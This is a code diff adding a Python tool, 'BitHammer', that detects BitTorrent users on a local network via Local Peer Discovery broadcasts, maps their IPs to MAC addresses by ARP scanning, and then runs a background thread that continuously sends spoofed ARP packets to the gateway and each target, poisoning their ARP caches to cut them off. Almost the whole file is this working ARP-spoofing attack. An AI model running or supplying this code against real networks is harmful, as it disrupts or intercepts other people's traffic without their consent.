@@ -1,0 +1,187 @@
+#!/usr/bin/env python
+
+import threading
+import logging
+import datetime
+import time
+import os
+import warnings
+
+import lpd
+from hashutils import bintohex
+
+# ignore deprecation warnings from scapy inclusion
+warnings.filterwarnings( "ignore", category = DeprecationWarning )
+# disable scapy warnings about ipv6 and shit like that
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+from scapy.all import srp,Ether,ARP,conf,sendp,ltoa,atol
+
+class BitHammer:
+
+    def __init__(self):
+
+        # Seconds to delay in loops
+        self.DELAY = 4
+
+        # Verbosity. 0=errors, 1=greeting, 2=show new bans, 3=show details, 4=show each ban
+        self.VERBOSITY = 2
+
+        # List of IP's that are found from ipSearcher.  These are consumed by macResolver.
+        self.ips = []
+        # MACs are populated by ipResolver, poisoned by aprPoisoner
+        self.macs = []
+
+        # Network info
+        self.interface    = conf.iface
+        self.network      = None
+        self.gateway      = None  # Gateway IP
+        self.gateway_hw   = None  # Gateway MAC
+
+        # Run forever
+        self.running = True
+
+        # Turn off scapy verbosity
+        conf.verb = 0
+
+        if self.VERBOSITY > 0:
+            print('Starting BitHammer.')
+
+        # Only as root
+        if not os.geteuid() == 0:
+            raise Exception( "BitHammer must be run as root" )
+
+        # Discover network gateway
+
+        if self.VERBOSITY > 2:
+            print "Finding network gateway ..."
+        # for route in conf.route.routes:
+        for net, msk, gw, iface, addr in conf.route.routes:
+          # found a route for given interface
+          if iface == self.interface:
+            network = ltoa( net )
+            # compute network representation if not yet done
+            if network.split('.')[0] == addr.split('.')[0]:
+              bits = self.bitCount( msk )
+              self.network = "%s/%d" % ( network, bits )
+            # search for a valid network gateway
+            if self.gateway is None and gw != '0.0.0.0':
+              self.gateway = gw
+   
+        if self.gateway is not None and self.network is not None:
+            if self.VERBOSITY > 2:
+                print "Gateway is %s on network %s at interface %s." % ( self.gateway, self.network, self.interface )
+        else:
+          raise Exception( "Error: network gateway not found." )
+
+    def loadSettings(self):
+        self.ips = []
+        self.macs = []
+
+    def bitCount( self, n ):
+        bits = 0
+        while n:
+            bits += n & 1
+            n   >>= 1
+        return bits
+
+    def ipSearcher(self):
+
+        if self.VERBOSITY > 2:
+            print('- Searching for Bittorrent IPs...')
+
+        # Continiously accept LDP broadcasts
+        s = lpd.LPDSocket()
+        while self.running:
+            # Listen for BitTorrent LPD announcements
+            data, sender = s.recv_announce()
+            now = datetime.datetime.now()
+            if data is not None:
+                # Add them to the list
+                infohash, port = data
+                if self.VERBOSITY > 2:
+                    print('  - Found Torrent: IP: {}: Hash: {}'.format(sender[0], bintohex(infohash)))
+                self.ips.append(sender[0])
+            else:
+                if self.VERBOSITY > 2:
+                    print('  - Invalid announce: IP: {}'.format(sender[0]))
+        s.close()
+
+    def ipResolver(self):
+        if self.VERBOSITY > 2:
+            print('= Resolving IPs to MACs...')
+        while self.running:
+            # Wait till there's an IP to search for.
+            if not self.ips:
+                time.sleep(self.DELAY)
+            else:
+                # Find all MAC's on the local network
+                self.gateway_hw = None
+                self.endpoints  = []
+                
+                # broadcast arping
+                ans,unans = srp( Ether( dst = "ff:ff:ff:ff:ff:ff" ) / ARP( pdst = self.network ), 
+                                 verbose = False, 
+                                 filter  = "arp and arp[7] = 2", 
+                                 timeout = 2, 
+                                 iface_hint = self.network )
+
+                for snd,rcv in ans:
+                  if rcv.psrc == self.gateway:
+                    self.gateway_hw = rcv.hwsrc
+                  else:
+                    self.endpoints.append( ( rcv.hwsrc, rcv.psrc ) )
+                
+                # Check the endpoints list for this ip
+                for (macEnd, ipEnd) in self.endpoints:
+                    for (ipSearch) in self.ips:
+                        # If found, remove ip and add mac
+                        if ipEnd == ipSearch:
+                            # make list unique
+                            if (macEnd, ipEnd) not in self.macs:
+                                if self.VERBOSITY > 1:
+                                    print('  = {} -> {}, new ban added'.format(ipEnd, macEnd))
+                                self.macs.append( (macEnd, ipEnd) )
+                            else:
+                                if self.VERBOSITY > 2:
+                                    print('  = {} -> {}, already banned'.format(ipEnd, macEnd))
+                            self.ips.remove(ipSearch)
+                                        
+    def aprPoisoner(self):
+        if self.VERBOSITY > 2:
+            print('# Banning MACs in background thread.')
+        while self.running:
+            time.sleep(self.DELAY)
+            # Poison in both directions
+            #   gateway -> us -> target
+            #   target  -> us -> gateway
+            for (mac, ip) in self.macs:
+                if self.VERBOSITY > 3:
+                    print('# poison {}->{}, {}->{}'.format(ip, mac, self.gateway, self.gateway_hw))
+                sendp( Ether( dst = self.gateway_hw ) / ARP( op = "who-has", psrc = ip,           pdst = self.gateway ), iface_hint = self.gateway )
+                sendp( Ether( dst = mac )             / ARP( op = "who-has", psrc = self.gateway, pdst = ip ),           iface_hint = self.gateway )
+
+    def hammer(self):
+
+        self.threadSearch = threading.Thread(target=self.ipSearcher)
+        self.threadSearch.daemon = True
+        self.threadSearch.start()
+
+        self.threadResolve = threading.Thread(target=self.ipResolver)
+        self.threadResolve.daemon = True
+        self.threadResolve.start()
+
+        self.threadPoison = threading.Thread(target=self.aprPoisoner)
+        self.threadPoison.daemon = True
+        self.threadPoison.start()
+
+        while True:
+            time.sleep(self.DELAY)
+
+
+if __name__ == '__main__':
+
+    bh = BitHammer()
+
+    bh.loadSettings()
+    bh.hammer()
